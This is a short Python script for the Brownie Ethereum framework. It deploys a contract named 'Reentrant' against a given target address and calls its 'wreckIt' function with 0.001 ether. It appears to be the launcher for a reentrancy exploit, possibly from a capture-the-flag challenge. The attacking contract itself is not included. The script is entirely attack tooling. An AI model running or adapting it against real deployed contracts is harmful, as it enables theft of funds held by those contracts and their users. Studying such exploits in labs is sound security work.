from brownie import Reentrant, accounts, web3

def main(target_addr):
  me = accounts.load("default")
  reentrant = Reentrant.deploy(target_addr, {'from': me})
  reentrant.wreckIt({'from':me, 'value': web3.toWei('0.001', 'ether')})